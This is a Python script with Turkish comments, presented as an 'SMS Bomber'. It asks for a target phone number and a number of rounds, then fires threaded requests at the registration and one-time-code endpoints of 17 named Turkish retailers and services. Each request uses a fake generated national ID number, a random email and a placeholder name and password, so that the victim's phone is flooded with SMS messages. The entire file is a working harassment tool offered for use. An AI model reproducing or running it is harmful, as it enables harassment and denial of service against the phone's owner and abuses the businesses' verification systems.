import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style, init
import threading
import time

# Colorama'yı başlat
init(autoreset=True)


class SendSms():
    def __init__(self, phone, mail=""):
        # Rastgele TC No Üretici (Algoritmaya uygun)
        rakam = []
        tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (
                rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] +
                      rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)

        self.tc = tcNo
        self.phone = str(target).replace(" ", "").replace("+90", "").replace("05", "5")
        self.adet = 0

        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"

    # --- API METODLARI ---

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
                       "Origin": "https://www.kahvedunyasi.com"}
            json = {"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("processStatus") == "Success":
                print(f"{Fore.LIGHTGREEN_EX}[+] Kahve Dünyası başarılı!")
                self.adet += 1
        except:
            pass

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/",
                                data={"confirm": "true", "email": self.mail, "phone": f"0{self.phone}",
                                      "first_name": "Memati", "last_name": "Bas", "password": "Password123!"},
                                timeout=6)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] Wmf başarılı!")
                self.adet += 1
        except:
            pass

    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone},
                                timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Bim başarılı!")
                self.adet += 1
        except:
            pass

    def Englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp",
                              json={"Phone": self.phone, "XID": ""}, timeout=6)
            if r.json().get("isError") == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] English Home başarılı!")
                self.adet += 1
        except:
            pass

    def Suiste(self):
        try:
            data = {"action": "register", "gsm": self.phone, "full_name": "Memati Bas", "password": "Password123!"}
            r = requests.post("https://suiste.com:443/api/auth/code", data=data, timeout=6)
            if r.json().get("code") == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] Suiste başarılı!")
                self.adet += 1
        except:
            pass

    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
                              json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Kim GB İster başarılı!")
                self.adet += 1
        except:
            pass

    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com:443/users/register/",
                              data={"phone": f"0{self.phone}", "email": self.mail, "confirm": "true"}, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] Evidea başarılı!")
                self.adet += 1
        except:
            pass

    def Ucdortbes(self):
        try:
            r = requests.post("https://api.345dijital.com:443/api/users/register",
                              json={"phoneNumber": f"+90{self.phone}", "name": "Memati"}, timeout=6)
            print(f"{Fore.LIGHTGREEN_EX}[+] 345 Dijital başarılı!")
            self.adet += 1
        except:
            pass

    def TiklaGelsin(self):
        try:
            json_data = {"operationName": "GENERATE_OTP", "variables": {"phone": f"+90{self.phone}"},
                         "query": "mutation GENERATE_OTP($phone: String) { generateOtp(phone: $phone) }"}
            r = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json_data, timeout=6)
            if r.json()["data"]["generateOtp"]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Tıkla Gelsin başarılı!")
                self.adet += 1
        except:
            pass

    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                              json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Naosstars başarılı!")
                self.adet += 1
        except:
            pass

    def Koton(self):
        try:
            r = requests.post("https://www.koton.com:443/users/register/",
                              data={"phone": f"0{self.phone}", "first_name": "Memati", "confirm": "true"}, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] Koton başarılı!")
                self.adet += 1
        except:
            pass

    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp",
                              data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
            if r.json().get("is_success"):
                print(f"{Fore.LIGHTGREEN_EX}[+] Hayat Su başarılı!")
                self.adet += 1
        except:
            pass

    def Hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net:443/mobil/account/sendOTP",
                              json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Hızlı Eczane başarılı!")
                self.adet += 1
        except:
            pass

    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend",
                              json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
            if r.json().get("status") == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] Metro Turkiye başarılı!")
                self.adet += 1
        except:
            pass

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send",
                              json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
            if r.json().get("responseType") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] File Market başarılı!")
                self.adet += 1
        except:
            pass

    def Akasya(self):
        try:
            r = requests.post("https://akasyaapi.poilabs.com:443/v1/en/sms", json={"phone": self.phone}, timeout=6)
            if "succesfully" in r.json().get("result", ""):
                print(f"{Fore.LIGHTGREEN_EX}[+] Akasya başarılı!")
                self.adet += 1
        except:
            pass

    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr:443/auth/auth/smskodugonder",
                              json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
            if r.json().get("Success"):
                print(f"{Fore.LIGHTGREEN_EX}[+] Komagene başarılı!")
                self.adet += 1
        except:
            pass

    def start_bombing(self, tur):
        servisler = [
            self.KahveDunyasi, self.Wmf, self.Bim, self.Englishhome,
            self.Suiste, self.KimGb, self.Evidea, self.Ucdortbes,
            self.TiklaGelsin, self.Naosstars, self.Koton, self.Hayatsu,
            self.Hizliecza, self.Metro, self.File, self.Akasya, self.Komagene
        ]

        for i in range(tur):
            print(f"\n{Fore.YELLOW}--- Tur {i + 1} Başlatılıyor ---")
            threads = []
            for servis in servisler:
                t = threading.Thread(target=servis)
                threads.append(t)
                t.start()
                time.sleep(0.1)  # Rate limit koruması

            for t in threads:
                t.join()
            print(f"{Fore.CYAN}Tur {i + 1} bitti. Toplam başarılı: {self.adet}")


# --- ANA PROGRAM ---
if __name__ == "__main__":
    print(f"{Fore.MAGENTA}SMS Bomber - Terminal Edition")
    target = input("Hedef Numara (5XXXXXXXXX): ")
    tur_sayisi = int(input("Kaç tur gönderilsin?: "))

    bomber = SendSms(target)
    bomber.start_bombing(tur_sayisi)

    print(f"\n{Fore.GREEN}İşlem tamamlandı. Toplam {bomber.adet} SMS isteği gönderildi.")